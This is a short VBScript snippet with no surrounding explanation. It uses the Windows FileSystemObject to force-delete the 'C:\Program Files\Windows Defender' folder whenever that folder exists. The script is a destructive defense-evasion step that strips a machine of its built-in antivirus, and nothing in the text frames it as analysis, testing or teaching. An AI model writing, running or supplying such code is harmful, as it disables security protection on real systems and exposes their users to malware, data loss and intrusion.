Set objFSO = CreateObject("Scripting.FileSystemObject")
strFolder = "C:\Program Files\Windows Defender"

If objFSO.FolderExists(strFolder) Then
    objFSO.DeleteFolder strFolder, True
End If
